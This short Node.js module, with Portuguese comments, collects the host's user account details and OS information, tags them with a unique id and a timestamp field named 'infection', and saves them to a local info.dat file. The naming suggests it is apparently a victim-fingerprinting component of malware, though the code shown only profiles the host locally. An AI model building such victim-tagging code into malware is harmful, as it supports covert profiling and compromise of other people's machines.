const os = require("os");
const uniqid = require("uniqid");
const fs = require("fs");
const path = require("path");

// obtem as informações do sistema
const systemInfo = {
  uuid: uniqid(),
  infection: Date.now(),
  user: os.userInfo(),
  os: {
    type: os.type(),
    platform: os.platform(),
    architechture: os.arch(),
    release: os.release()
  }
};

const IdGenerator = () => {
  // Salva os dados do sistema num arquivo binário
  const infoPath = path.join(__dirname, "..", "info.dat");
  fs.writeFileSync(infoPath, JSON.stringify(systemInfo));
  return systemInfo;
};

module.exports = IdGenerator;
